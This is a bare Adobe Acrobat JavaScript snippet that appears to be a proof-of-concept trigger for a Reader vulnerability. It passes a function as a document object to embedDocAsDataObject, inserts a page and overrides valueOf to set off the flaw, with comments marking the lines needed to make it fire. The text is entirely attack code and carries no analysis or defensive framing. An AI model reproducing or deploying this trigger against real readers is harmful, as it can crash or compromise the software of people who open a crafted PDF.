app.trigger = function() {
    app.doc.embedDocAsDataObject({cName:"http://www.B.com", oDoc:app.trigger});
}


//must keep this line
//cannot execute on AcroRd32.exe
try{app.doc.newPage({nWidth:200, nHeight:72, nPage:2});}catch(e){}

//trigger
try{ooo.valueOf = app.trigger;}catch(e){}

//must keep this line 
try{ooo.valueOf();}catch(e){}


